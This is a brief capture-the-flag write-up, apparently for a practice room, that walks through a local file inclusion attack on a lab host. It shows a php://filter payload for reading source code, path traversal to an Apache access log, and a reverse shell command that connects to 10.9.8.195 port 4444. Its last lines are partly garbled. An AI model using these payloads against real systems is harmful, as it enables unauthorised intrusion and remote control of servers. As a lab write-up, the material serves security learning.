# In this room, we are going to look into LFI.

We perform an nmap scan where we see that ports 22 and 80 are open.

Also, we access the site and see that there is a website that is running on the site. We can see an email section that reveals another hostname that we can use since nothing interesting on our current site.

Before visiting the site, you must add to the `/etc/hosts` file. Upon visiting the site, I did some dirsearch on the site and found a `test.php` directory, which can also be seen when we visit the `robots.txt`

When I visited the directory, I found that it was redirecting me to another file. This indicates that there is locoal file inclusion vulnerability available on the site.

<img width="871" height="233" alt="Screenshot From 2025-08-29 22-22-12" src="https://github.com/user-attachments/assets/5106905d-6241-44f3-952a-6ef03ee4c140" />

We can use the `php://filter` to encode the source code to Base64 and bypass the security.

```bash
php://filter/convert.base64-encode/resource=
```

```bash
http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
```

<img width="1919" height="265" alt="Screenshot From 2025-08-29 22-38-13" src="https://github.com/user-attachments/assets/baecda37-372b-4f42-8da4-c5d510f0cdfd" />

 Best way to exploit lfi is to look at the code. We shall take the base64 encoding on the page and then decode it, and see what it has. After decoding it, this is what we got.

 <img width="1919" height="685" alt="Screenshot From 2025-08-29 22-39-27" src="https://github.com/user-attachments/assets/93c939cd-f163-4821-bfd8-dc683b345b73" />

 /test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log&cmd=/bin/bash -c ‘bash -i > /dev/tcp/10.9.8.195/4444 0>&1

 1
GET/test.php?view=/var/www/html/development_testing/..////////var/log/apache2/access.log&cmd=
/bin/bash+-c+'bash+-1+>+/dev/tcp/10.9.8.195/4444+0>%261' HTTP/1.1
Hocti mafialiug thm

